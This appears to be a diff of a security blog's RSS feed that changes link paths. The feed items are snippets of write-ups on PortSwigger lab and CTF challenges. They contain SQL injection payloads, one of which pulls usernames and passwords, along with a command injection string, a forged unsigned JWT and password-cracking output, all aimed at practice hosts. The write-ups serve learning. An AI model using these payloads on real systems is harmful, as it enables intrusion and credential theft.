  &lt;a class="anchor" href="#lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-four">#&lt;/a>
 &lt;/h1>
@@ -433,7 +433,7 @@ The application has a login function, and the database contains a table that hol
 &lt;ol>
 &lt;li>
 &lt;p>Determine # of columns
-Payload: &lt;code>?category=Gifts' union select NULL,NULL --&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, listing the database contents on Oracle</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/</guid><description>&lt;h1 id="lab-sql-injection-attack-listing-the-database-contents-on-oracle">
+Payload: &lt;code>?category=Gifts' union select NULL,NULL --&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, listing the database contents on Oracle</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/</guid><description>&lt;h1 id="lab-sql-injection-attack-listing-the-database-contents-on-oracle">
  Lab: SQL injection attack, listing the database contents on Oracle
  &lt;a class="anchor" href="#lab-sql-injection-attack-listing-the-database-contents-on-oracle">#&lt;/a>
 &lt;/h1>
@@ -454,7 +454,7 @@ The application has a login function, and the database contains a table that hol
 &lt;ol>
 &lt;li>
 &lt;p>Determine # of columns
-Payload: &lt;code>?category=Lifestyle' union select NULL,NULL from dual--&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/</guid><description>&lt;h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">
+Payload: &lt;code>?category=Lifestyle' union select NULL,NULL from dual--&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/</guid><description>&lt;h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">
  Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
  &lt;a class="anchor" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">#&lt;/a>
 &lt;/h1>
@@ -485,7 +485,7 @@ Payload: &lt;code>?category=Accessories' union select 'abc',@@version -- #&lt;/c
 &lt;h2 id="reference">
  Reference
  &lt;a class="anchor" href="#reference">#&lt;/a>
-&lt;/h2></description></item><item><title>Lab: SQL injection attack, querying the database type and version on Oracle</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/</guid><description>&lt;h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">
+&lt;/h2></description></item><item><title>Lab: SQL injection attack, querying the database type and version on Oracle</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/</guid><description>&lt;h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">
  Lab: SQL injection attack, querying the database type and version on Oracle
  &lt;a class="anchor" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">#&lt;/a>
 &lt;/h1>
@@ -505,7 +505,7 @@ Payload: &lt;code>?category=Accessories' union select 'abc',@@version -- #&lt;/c
 &lt;img src="https://i.imgur.com/Qxtgz5u.png" alt="" />
 :::warning
 Before the recon, the hint told you that this database is created by &lt;code>Oracle&lt;/code>. So, you must contained &lt;code>From&lt;/code> preserved word in each query, e.g. &lt;code>SELECT 'abc' FROM dual&lt;/code>
-:::&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, determining the number of columns returned by the query</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">
+:::&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, determining the number of columns returned by the query</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">
  Lab: SQL injection UNION attack, determining the number of columns returned by the query
  &lt;a class="anchor" href="#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">#&lt;/a>
 &lt;/h1>
@@ -524,7 +524,7 @@ Before the recon, the hint told you that this database is created by &lt;code>Or
 &lt;p>Payload: &lt;code>https://0ab2008b04e96b8f8057358e008d00d0.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL,NULL--&lt;/code>
 :::spoiler Success Screenshot
 &lt;img src="https://i.imgur.com/yZ3QPPF.png" alt="" />
-:::&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, finding a column containing text</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-finding-a-column-containing-text">
+:::&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, finding a column containing text</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-finding-a-column-containing-text">
  Lab: SQL injection UNION attack, finding a column containing text
  &lt;a class="anchor" href="#lab-sql-injection-union-attack-finding-a-column-containing-text">#&lt;/a>
 &lt;/h1>
@@ -544,7 +544,7 @@ Before the recon, the hint told you that this database is created by &lt;code>Or
 &lt;li>
 &lt;p>Determine how many columns it has
 You can use the technique from previous question.
-Payload: &lt;code>?category=' UNION SELECT NULL,NULL,NULL--&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, retrieving data from other tables</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-retrieving-data-from-other-tables">
+Payload: &lt;code>?category=' UNION SELECT NULL,NULL,NULL--&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, retrieving data from other tables</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-retrieving-data-from-other-tables">
  Lab: SQL injection UNION attack, retrieving data from other tables
  &lt;a class="anchor" href="#lab-sql-injection-union-attack-retrieving-data-from-other-tables">#&lt;/a>
 &lt;/h1>
@@ -577,7 +577,7 @@ Password: &lt;code>5kg73b7jinl9plif82d3&lt;/code>
 &lt;h2 id="reference">
  Reference
  &lt;a class="anchor" href="#reference">#&lt;/a>
-&lt;/h2></description></item><item><title>Lab: SQL injection UNION attack, retrieving multiple values in a single column</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">
+&lt;/h2></description></item><item><title>Lab: SQL injection UNION attack, retrieving multiple values in a single column</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">
  Lab: SQL injection UNION attack, retrieving multiple values in a single column
  &lt;a class="anchor" href="#lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">#&lt;/a>
 &lt;/h1>
@@ -617,7 +617,7 @@ Payload: &lt;code>?category=Gifts' UNION SELECT NULL,username||'~'||password FRO
 &lt;h2 id="reference">
  Reference
  &lt;a class="anchor" href="#reference">#&lt;/a>
-&lt;/h2></description></item><item><title>Lab: Stored DOM XSS</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/</guid><description>&lt;h1 id="lab-stored-dom-xss">
+&lt;/h2></description></item><item><title>Lab: Stored DOM XSS</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/</guid><description>&lt;h1 id="lab-stored-dom-xss">
  Lab: Stored DOM XSS
  &lt;a class="anchor" href="#lab-stored-dom-xss">#&lt;/a>
 &lt;/h1>
@@ -636,7 +636,7 @@ Payload: &lt;code>?category=Gifts' UNION SELECT NULL,username||'~'||password FRO
 &lt;ol>
 &lt;li>
 &lt;p>Find the injected place
-According to the description, we know that the comment place of each post has some problems. So, we can try to inject something.&lt;/p></description></item><item><title>Lab: Using application functionality to exploit insecure deserialization</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/</guid><description>&lt;h1 id="lab-using-application-functionality-to-exploit-insecure-deserialization">
+According to the description, we know that the comment place of each post has some problems. So, we can try to inject something.&lt;/p></description></item><item><title>Lab: Using application functionality to exploit insecure deserialization</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/</guid><description>&lt;h1 id="lab-using-application-functionality-to-exploit-insecure-deserialization">
  Lab: Using application functionality to exploit insecure deserialization
  &lt;a class="anchor" href="#lab-using-application-functionality-to-exploit-insecure-deserialization">#&lt;/a>
 &lt;/h1>
@@ -651,7 +651,7 @@ According to the description, we know that the comment place of each post has so
 &lt;li>
 &lt;p>Goal: To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&amp;rsquo;s home directory.&lt;/p>
 &lt;p>You can log in to your own account using the following credentials: wiener:peter
-You also have access to a backup account: gregg:rosebud&lt;/p></description></item><item><title>NISRA - different places</title><link>https://bernie6401.github.io/security/practice/nisra/web/nisra---different-places/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/web/nisra---different-places/</guid><description>&lt;h1 id="nisra---different-places">
+You also have access to a backup account: gregg:rosebud&lt;/p></description></item><item><title>NISRA - different places</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---different-places/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---different-places/</guid><description>&lt;h1 id="nisra---different-places">
  NISRA - different places
  &lt;a class="anchor" href="#nisra---different-places">#&lt;/a>
 &lt;/h1>
@@ -680,7 +680,7 @@ It uses get method to fetch the parameters. So we can peek &lt;code>login.php&lt
 &lt;img src="https://i.imgur.com/oGFwOoA.png" alt="" />
 Then we could use the username and password we got at previous step.
 Payload: &lt;code>view-source:http://chall2.nisra.net:41025/login.php?username=admin&amp;amp;password=nisra&lt;/code>
-Then we got the last fragment flag.&lt;/p></description></item><item><title>NISRA - MD5_1</title><link>https://bernie6401.github.io/security/practice/nisra/web/nisra---md5_1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/web/nisra---md5_1/</guid><description>&lt;h1 id="nisra---md5_1">
+Then we got the last fragment flag.&lt;/p></description></item><item><title>NISRA - MD5_1</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_1/</guid><description>&lt;h1 id="nisra---md5_1">
  NISRA - MD5_1
  &lt;a class="anchor" href="#nisra---md5_1">#&lt;/a>
 &lt;/h1>
@@ -720,7 +720,7 @@ Then we got the last fragment flag.&lt;/p></description></item><item><title>NISR
 &lt;p>Payload: &lt;code>http://chall2.nisra.net:41022/?user=admin&amp;amp;password=240610708&lt;/code>
 :::spoiler flag
 &lt;code>Flag: NISRA{PhP_is_th3_BeST_laNgUA9E}&lt;/code>
-:::&lt;/p></description></item><item><title>NISRA - MD5_2</title><link>https://bernie6401.github.io/security/practice/nisra/web/nisra---md5_2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/web/nisra---md5_2/</guid><description>&lt;h1 id="nisra---md5_2">
+:::&lt;/p></description></item><item><title>NISRA - MD5_2</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_2/</guid><description>&lt;h1 id="nisra---md5_2">
  NISRA - MD5_2
  &lt;a class="anchor" href="#nisra---md5_2">#&lt;/a>
 &lt;/h1>
@@ -734,7 +734,7 @@ Flag: &lt;code>NISRA{S3CuR17y_1ssuEs_Of_pHP_@ND_Md5}&lt;/code>&lt;/p>
  Reference
  &lt;a class="anchor" href="#reference">#&lt;/a>
 &lt;/h2>
-&lt;p>&lt;a href="https://news.ycombinator.com/item?id=9484757">md5(&amp;lsquo;240610708&amp;rsquo;) == md5(&amp;lsquo;QNKCDZO&amp;rsquo;)&lt;/a>&lt;/p></description></item><item><title>NTU CS 2023 HW4 Write Up</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw4-write-up">
+&lt;p>&lt;a href="https://news.ycombinator.com/item?id=9484757">md5(&amp;lsquo;240610708&amp;rsquo;) == md5(&amp;lsquo;QNKCDZO&amp;rsquo;)&lt;/a>&lt;/p></description></item><item><title>NTU CS 2023 HW4 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw4-write-up">
  NTU CS 2023 HW4 Write Up
  &lt;a class="anchor" href="#ntu-cs-2023-hw4-write-up">#&lt;/a>
 &lt;/h1>
@@ -786,7 +786,7 @@ SELECT * FROM admin WHERE (username=&amp;rsquo;&amp;rsquo;) or (&amp;lsquo;1&amp
  Lab-Jinja2 SSTI
  &lt;a class="anchor" href="#lab-jinja2-ssti">#&lt;/a>
 &lt;/h2>
-&lt;p>Flag: &lt;code>FLAG{ssti.__class__.__pwn__}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - caas</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---caas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---caas/</guid><description>&lt;h1 id="picoctf---caas">
+&lt;p>Flag: &lt;code>FLAG{ssti.__class__.__pwn__}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - caas</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---caas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---caas/</guid><description>&lt;h1 id="picoctf---caas">
  PicoCTF - caas
  &lt;a class="anchor" href="#picoctf---caas">#&lt;/a>
 &lt;/h1>
@@ -829,7 +829,7 @@ app.listen(3000, () =&amp;gt; {
  &lt;a class="anchor" href="#exploit---easy-command-injection">#&lt;/a>
 &lt;/h2>
 &lt;p>Payload: &lt;code>/cowsay/123;ls;cat falg.txt&lt;/code>
-Flag: &lt;code>picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Cookies</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---cookies/</guid><description>&lt;h1 id="picoctf---cookies">
+Flag: &lt;code>picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Cookies</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---cookies/</guid><description>&lt;h1 id="picoctf---cookies">
  PicoCTF - Cookies
  &lt;a class="anchor" href="#picoctf---cookies">#&lt;/a>
 &lt;/h1>
@@ -865,7 +865,7 @@ Flag: &lt;code>picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooo
 When I input something, it&amp;rsquo;ll redirect to another page
 &lt;img src="https://i.imgur.com/Pq7XpNZ.png" alt="" />
 &lt;img src="https://i.imgur.com/pKZJWfd.png" alt="" />
-I tried to change cookie to different number and also modify the different value of &lt;code>name&lt;/code> parameter however, still got wrong information.&lt;/p></description></item><item><title>PicoCTF - dont-use-client-side</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---dont-use-client-side/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---dont-use-client-side/</guid><description>&lt;h1 id="picoctf---dont-use-client-side">
+I tried to change cookie to different number and also modify the different value of &lt;code>name&lt;/code> parameter however, still got wrong information.&lt;/p></description></item><item><title>PicoCTF - dont-use-client-side</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---dont-use-client-side/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---dont-use-client-side/</guid><description>&lt;h1 id="picoctf---dont-use-client-side">
  PicoCTF - dont-use-client-side
  &lt;a class="anchor" href="#picoctf---dont-use-client-side">#&lt;/a>
 &lt;/h1>
@@ -879,7 +879,7 @@ I tried to change cookie to different number and also modify the different value
  &lt;a class="anchor" href="#exploit---page-source-code">#&lt;/a>
 &lt;/h2>
 &lt;p>&lt;img src="https://i.imgur.com/UBYEt6F.png" alt="" />
-&lt;code>picoCTF{no_clients_plz_b706c5}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Insp3ct0r</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---insp3ct0r/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---insp3ct0r/</guid><description>&lt;h1 id="picoctf---insp3ct0r">
+&lt;code>picoCTF{no_clients_plz_b706c5}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Insp3ct0r</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---insp3ct0r/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---insp3ct0r/</guid><description>&lt;h1 id="picoctf---insp3ct0r">
  PicoCTF - Insp3ct0r
  &lt;a class="anchor" href="#picoctf---insp3ct0r">#&lt;/a>
 &lt;/h1>
@@ -935,7 +935,7 @@ I tried to change cookie to different number and also modify the different value
  &amp;lt;/body&amp;gt;
 &amp;lt;/html&amp;gt;
 &lt;/code>&lt;/pre>&lt;p>CSS
-Download it and search specific string&lt;/p></description></item><item><title>PicoCTF - It is my Birthday</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---it-is-my-birthday/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---it-is-my-birthday/</guid><description>&lt;h1 id="picoctf---it-is-my-birthday">
+Download it and search specific string&lt;/p></description></item><item><title>PicoCTF - It is my Birthday</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---it-is-my-birthday/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---it-is-my-birthday/</guid><description>&lt;h1 id="picoctf---it-is-my-birthday">
  PicoCTF - It is my Birthday
  &lt;a class="anchor" href="#picoctf---it-is-my-birthday">#&lt;/a>
 &lt;/h1>
@@ -960,7 +960,7 @@ Note that, you must notice the file size you uploaded can not too large.&lt;/p>
  Source code - After Exploit
  &lt;a class="anchor" href="#source-code---after-exploit">#&lt;/a>
 &lt;/h2>
-&lt;p>:::spoiler after exploit you can get the source code &amp;amp; flag&lt;/p></description></item><item><title>PicoCTF - JAUTH</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jauth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jauth/</guid><description>&lt;h1 id="picoctf---jauth">
+&lt;p>:::spoiler after exploit you can get the source code &amp;amp; flag&lt;/p></description></item><item><title>PicoCTF - JAUTH</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jauth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jauth/</guid><description>&lt;h1 id="picoctf---jauth">
  PicoCTF - JAUTH
  &lt;a class="anchor" href="#picoctf---jauth">#&lt;/a>
 &lt;/h1>
@@ -984,7 +984,7 @@ Payload: &lt;code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg3NzY0MjM1MT
  Reference
  &lt;a class="anchor" href="#reference">#&lt;/a>
 &lt;/h2>
-&lt;p>&lt;a href="https://youtu.be/njsjTVcwGwY"> picoCTF : JAUTH (Challenge 8) &lt;/a>&lt;/p></description></item><item><title>PicoCTF - Java Code Analysis!?!</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-code-analysis_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-code-analysis_/</guid><description>&lt;h1 id="picoctf---java-code-analysis">
+&lt;p>&lt;a href="https://youtu.be/njsjTVcwGwY"> picoCTF : JAUTH (Challenge 8) &lt;/a>&lt;/p></description></item><item><title>PicoCTF - Java Code Analysis!?!</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-code-analysis_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-code-analysis_/</guid><description>&lt;h1 id="picoctf---java-code-analysis">
  PicoCTF - Java Code Analysis!?!
  &lt;a class="anchor" href="#picoctf---java-code-analysis">#&lt;/a>
 &lt;/h1>
@@ -1012,7 +1012,7 @@ Payload: &lt;code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg3NzY0MjM1MT
  Recon
  &lt;a class="anchor" href="#recon">#&lt;/a>
 &lt;/h2>
-&lt;p>這一題在AIS3 pre-exam的時候也有看到，但當時根本沒想法，只要題目看起來一複雜我就沒辦法分析了，所以還是看了Martin大的WP才知道解法，但有時候真的很考驗耐心，先看hint發現應該是考跟JWT有關&lt;/p></description></item><item><title>PicoCTF - Java Script Kiddie</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-script-kiddie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-script-kiddie/</guid><description>&lt;h1 id="picoctf---java-script-kiddie">
+&lt;p>這一題在AIS3 pre-exam的時候也有看到，但當時根本沒想法，只要題目看起來一複雜我就沒辦法分析了，所以還是看了Martin大的WP才知道解法，但有時候真的很考驗耐心，先看hint發現應該是考跟JWT有關&lt;/p></description></item><item><title>PicoCTF - Java Script Kiddie</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-script-kiddie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-script-kiddie/</guid><description>&lt;h1 id="picoctf---java-script-kiddie">
  PicoCTF - Java Script Kiddie
  &lt;a class="anchor" href="#picoctf---java-script-kiddie">#&lt;/a>
 &lt;/h1>
@@ -1090,7 +1090,7 @@ Payload: &lt;code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg3NzY0MjM1MT
 
 	&amp;lt;/body&amp;gt;
 &amp;lt;/html&amp;gt;
-&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - JaWT Scratchpad</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jawt-scratchpad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jawt-scratchpad/</guid><description>&lt;h1 id="picoctf---jawt-scratchpad">
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - JaWT Scratchpad</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jawt-scratchpad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jawt-scratchpad/</guid><description>&lt;h1 id="picoctf---jawt-scratchpad">
  PicoCTF - JaWT Scratchpad
  &lt;a class="anchor" href="#picoctf---jawt-scratchpad">#&lt;/a>
 &lt;/h1>
@@ -1124,7 +1124,7 @@ ilovepico (?)
 1g 0:00:00:02 DONE (2023-06-26 18:42) 0.3673g/s 2720Kp/s 2720Kc/s 2720KC/s ilovetitoelbambino..ilovejesus71
